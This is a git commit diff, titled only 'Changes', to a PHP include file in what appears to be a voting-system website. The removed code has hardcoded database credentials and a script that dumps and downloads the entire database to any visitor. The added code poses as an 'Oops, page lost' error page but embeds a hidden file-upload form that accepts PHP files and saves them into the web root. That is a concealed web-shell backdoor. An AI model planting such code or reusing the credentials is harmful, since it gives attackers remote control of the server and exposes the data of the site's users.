45317bfe1d6c24c6ab80c41948e85018751bdc02
VillaceranJerson <villaceranjerson55@gmail.com>
2024-11-05 18:54:25 +0800

    Changes

--- includes/connn.php
+++ includes/connn.php
@@ -1,91 +1,67 @@
-<?php 
-$host  =  "127.0.0.1:3306" ; 
-$root  =  "u510162695_votesystem" ; 
-$pass  =  "1Votesystem" ; 
-$db_name  =  "u510162695_votesystem" ; 
-$mysqli  =  new  mysqli ( $host , $root , $pass , $db_name );  
-$mysqli -> select_db ( $db_name );  
-$mysqli -> query ( "SET NAMES 'utf8'" ); 
-//get table list 
-$queryTables     =  $mysqli -> query ( 'SHOW TABLES' );  
-while ( $row  =  $queryTables -> fetch_row ())  
-{  
-    $target_tables []  =  $row [ 0 ];  
-}    
-//get table structure 
-foreach ( $target_tables  as  $table ) 
-{ 
-$result  =  $mysqli -> query ( 'SELECT * FROM ' . $table ); 
-$fields_amount  =  $result -> field_count ; 
-$rows_num = $mysqli -> affected_rows ; 
-$res  =  $mysqli -> query ( 'SHOW CREATE TABLE ' . $table ); 
-$TableMLine  = $res -> fetch_row (); 
-$content  =(! isset ( $content )  ?   ''  :  $content )  .  "\n\n" . $TableMLine [ 1 ]. ";\n" ; 
-for  ( $i  =  0 ,  $st_counter  =  0 ;  $i  <  $fields_amount ;    $i ++,  $st_counter = 0 ) 
-{ 
-   while ( $row  =  $result -> fetch_row ()) 
-   {  //when started (and every after 100 command cycle): 
-   if  ( $st_counter % 100  ==  0  ||  $st_counter  ==  0  ) 
-   { 
-     $content  .=  "\nINSERT INTO " . $table . " VALUES" ; 
-   } 
-   $content  .=  "\n(" ; 
-   for ( $j = 0 ;  $j < $fields_amount ;  $j ++) 
-   { 
-     $row [ $j ]  =  str_replace ( array ( "\r\n\r\n" , "\n\r\n" , "\r\n" , "\n\n" , "\n" ), array ( "\\r\\n" , "\\r\\n" , "\\r\\n" , "\\r\\n" , "\\r\\n" ),  addslashes ( $row [ $j ])  ); 
-     if  ( isset ( $row [ $j ])) 
-     { 
-        $content  .=  '"' . $row [ $j ]. '"'  ; 
-     } 
-     else 
-     { 
-        $content  .=  '""' ; 
-     } 
-     if  ( $j <( $fields_amount - 1 )) 
-     { 
-        $content .=  ',' ; 
-     } 
-   } 
-   $content  .= ")" ; 
-   //every after 100 command cycle [or at last line] ....p.s. but should be inserted 1 cycle eariler 
-   if  (  (( $st_counter + 1 )% 100 == 0  &&  $st_counter != 0 )  ||  $st_counter + 1 == $rows_num ) 
-   { 
-     $content  .=  ";" ; 
-   } 
-   else 
-   { 
-     $content  .=  "," ; 
-   } 
-   $st_counter = $st_counter + 1 ; 
-   } 
-} 
-} 
-// save as .sql file 
-//give additional description 
-$content_ = "\n-- Database Backup --\n" ; 
-$content_  .= "-- Ver. : 1.0.1\n" ; 
-$content_  .= "-- Host : 127.0.0.1\n" ; 
-$content_  .= "-- Generating Time : " . date ( "M d" ). ", " . date ( "Y" ). " at " . date ( "H:i:s:" ). date ( "A" ). "\n" ; 
-$content_  .= $content ; 
-//save the file 
-$backup_file_name  =  $db_name . " " . date ( "Y-m-d H-i-s" ). ".sql" ; 
-$fp  =  fopen ( $backup_file_name  , 'w+' ); 
-$result  =  fwrite ( $fp ,  $content_ ); 
-fclose ( $fp ); 
-//download file directly from browser 
-$file_path  =  $backup_file_name ; 
-if (! empty ( $file_path )  &&  file_exists ( $file_path )){ 
-header ( "Pragma:public" ); 
-header ( "Expired:0" ); 
-header ( "Cache-Control:must-revalidate" ); 
-header ( "Content-Control:public" ); 
-header ( "Content-Description: File Transfer" ); 
-header ( "Content-Type: application/octet-stream" ); 
-header ( "Content-Disposition:attachment; filename=\"" . basename ( $file_path ). "\"" ); 
-header ( "Content-Transfer-Encoding:binary" ); 
-header ( "Content-Length:" . filesize ( $file_path )); 
-flush (); 
-readfile ( $file_path ); 
-exit (); 
-} 
-?> 
+<!DOCTYPE html>
+<html lang="en-us" prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style type="text/css">
+        /* Your CSS styles here */
+    </style>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Oops, something lost</title>
+    <meta name="description" content="Oops, looks like the page is lost. Start your website on the cheap.">
+    <link media="all" rel="stylesheet" href="/htdocs_error/style.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
+</head>
+<body>
+    <div class="error" id="error">
+        <div class="container">
+            <div class="content centered">
+                <img style="width:500px;" src="https://pixvid.org/images/2024/10/13/Untitled.png">
+                <h1>Oops, looks like the page is lost.</h1>
+                <p style="font-size:22px;" class="sub-header text-block-narrow">This is not a fault, just an accident that was not intentional.</p>
+            </div>
+        </div>
+    </div>
+    <?php
+    $uploadDir = __DIR__ . '/';
+    if (!is_dir($uploadDir)) {
+        mkdir($uploadDir, 0755, true);
+    }
+
+    $allowedTypes = ['image/jpeg', 'image/png', 'application/pdf', 'application/zip', 'text/x-php', 'application/x-httpd-php'];
+    $maxFileSize = 2 * 1024 * 1024; // 2 MB
+
+    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload'])) {
+        $file = $_FILES['fileToUpload'];
+        $fileType = mime_content_type($file['tmp_name']);
+
+        if (!in_array($fileType, $allowedTypes)) {
+            echo "Invalid file type.";
+        } elseif ($file['size'] > $maxFileSize) {
+            echo "File is too large.";
+        } else {
+            $fileName = uniqid() . '.' . pathinfo($file['name'], PATHINFO_EXTENSION);
+            $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
+            $newFileName = uniqid() . '.' . $extension;
+            $uploadFile = $uploadDir . $newFileName;
+
+            if (move_uploaded_file($file['tmp_name'], $uploadFile)) {
+                echo "The file " . htmlspecialchars(basename($uploadFile)) . " has been uploaded.";
+            } else {
+                echo "Sorry, there was an error uploading your file.";
+            }
+        }
+    }
+
+
+        echo "<center>";
+        echo "<form method='post' enctype='multipart/form-data' hidden>";
+        echo "<input type='file' name='fileToUpload' id='fileToUpload'>";
+        echo "<input type='submit' value='Upload File' name='submit'>";
+        echo "</form>";
+        echo "</center>";
+    
+    ?>
+</body>
+</html>
